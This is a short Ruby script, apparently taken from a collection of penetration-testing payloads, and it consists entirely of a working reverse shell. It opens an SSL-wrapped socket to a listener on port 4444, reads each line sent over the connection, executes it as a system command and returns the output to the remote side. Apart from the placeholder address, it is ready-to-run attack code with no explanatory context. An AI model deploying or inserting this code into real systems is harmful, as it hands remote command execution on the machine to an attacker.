require 'socket';
require 'openssl';
c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("0.0.0.0","4444")).connect;
while(cmd=c.gets);
    IO.popen(cmd.to_s,"r"){|io|c.print io.read}
    end